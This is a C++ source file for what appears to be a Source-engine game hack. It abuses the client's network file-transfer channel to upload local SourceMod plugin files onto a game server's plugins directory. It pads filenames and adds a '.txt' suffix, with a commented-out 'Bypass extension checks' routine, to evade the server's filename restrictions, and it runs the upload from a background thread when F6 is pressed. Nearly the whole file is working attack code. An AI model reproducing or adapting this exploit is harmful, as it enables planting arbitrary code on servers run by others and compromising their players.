#include "Includes.hxx"
#include "Hack_LagServer.hxx"

__pragma( warning( push ) )
__pragma( warning( disable:4129 ) )

CHackServer *HackServer = new CHackServer();
static bool bShouldSend = true;

bool __fastcall new_Buf_WriteString( _FASTCALLD , const char* cString )
{
    bf_write* pWrite = ( bf_write* ) ThisPTR;

    /*if ( _ReturnAddress() != _GetModule<Pointer>( "engine.dll" , 0x22D324 ) )
        return pWrite->WriteString( cString );
    {
        char buf[ 260 ];
        strcpy_s( buf , cString );
        std::string path = buf;
        path.append( ( sizeof( buf ) - 5 ) - path.length() , ' ' ); // Bypass extension checks
        path.append( ".txt" );
        const char *pcStringMod = path.c_str();

        if ( pcStringMod )
        {
            do
            {
                pWrite->WriteChar( *pcStringMod );
                ++pcStringMod;
            } while ( *( pcStringMod - 1 ) != 0 );
        }
        else
        {
            pWrite->WriteChar( 0 );
        }
    }*/

    return pWrite->WriteString( cString );
}

void CHackServer::SendFile( const char* sPathClient , const char* sPathServer )
{
    const char *pPathID = AutoConvertC( TEXT( "GAME" ) );

    INetChannel *channel = ( INetChannel * ) EngineClient->GetNetChannelInfo();

    if ( channel != NULL )
    {
        dataFragments_t *data = new dataFragments_t();

        data->file = FileSystem->Open( sPathClient , AutoConvertC( TEXT( "rb" ) ) , pPathID );

        if ( data->file == FILESYSTEM_INVALID_HANDLE )
        {
            EngineClient->Con_NPrintf( 2 , AutoConvertC( TEXT( "Couldn't open %s.\n" ) ) , sPathClient );
            return;
        }

        data->bytes = FileSystem->Size( data->file );
        data->buffer = NULL;
        data->isCompressed = false;
        data->isDemo = false;
        data->nUncompressedSize = 0;
        data->transferID = 0;

        strcpy_s( data->filename , sPathServer );

        _OffsetManualthis( 0x144 , CUtlVector<dataFragments_t*> , channel ).AddToTail( data );

        data->asTCP = false;
        data->numFragments = BYTES2FRAGMENTS( data->bytes );
        data->ackedFragments = 0;
        data->pendingFragments = 0;
    }
}

bool SendingFiles()
{
    INetChannel *channel = ( INetChannel * ) EngineClient->GetNetChannelInfo();

    if ( channel != NULL )
    {
        return 0 < _OffsetManualthis( 0x144 , CUtlVector<dataFragments_t*> , channel ).m_Size;
    }

    return 0;
}

HEX __stdcall CHackServer::Thread_SendFile( Pointer pSomething )
{
    while ( true )
    {
        static bool bSending = false;
        if ( SendingFiles() )
        {
            EngineClient->Con_NPrintf( 0 , "Sending files to server, wait..." );
            bSending = true;
        }
        else
        {
            if ( bSending )
            {
                EngineClient->Con_NPrintf( 0 , "Complete!" );
                bSending = false;
            }
        }

        if ( GetAsyncKeyState( VK_F6 ) )
        {
            if ( bShouldSend )
            {
                char buf[ 4096 ] = "" , bufp[ 261 ] = "";
                for ( int i = 0; i < 260; i++ )
                {
                    strcat( bufp , "3" );
                    sprintf( buf , "addons\\sourcemod\\plugins\\%s.smx.txt" , bufp );
                    int len = strlen( buf );
                    if ( len < 260 )
                        HackServer->SendFile( "addons\\hack\\zombie.smx" , buf );
                }

                HackServer->SendFile( "addons\\hack\\customplugin.smx" , "addons\\sourcemod\\plugins\\1.tmp" );
                bShouldSend = false;
            }
        }
        else
        {
            bShouldSend = true;
        }
    }

    return 1;
}
__pragma( warning( pop ) )

void CHackServer::Create()
{
    DO_ONCE
    (
        hThread = CreateThread( nullptr , 0 , ( LPTHREAD_START_ROUTINE ) ( Pointer ) Thread_SendFile , ( Pointer ) nullptr , 0 , nullptr );
    SetThreadPriority( hThread , 99 );
    SetThreadPriorityBoost( hThread , true );
    );
}

void CHackServer::Delete()
{
    TerminateThread( hThread , 1 );
}